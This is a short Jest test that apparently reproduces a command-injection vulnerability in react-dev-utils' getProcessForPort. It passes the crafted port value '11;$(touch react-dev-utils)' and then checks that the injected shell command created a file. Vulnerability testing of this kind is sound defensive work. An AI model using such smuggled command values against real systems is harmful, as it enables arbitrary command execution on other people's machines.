//https://github.com/facebook/create-react-app/pull/10644
test("Command Injection in react-dev-utils", () => {
  expect.assertions(2);
  const getProcessForPort = require("react-dev-utils/getProcessForPort");
  const fs = require("fs");
  const path = "./react-dev-utils";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  getProcessForPort("11;$(touch react-dev-utils)");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
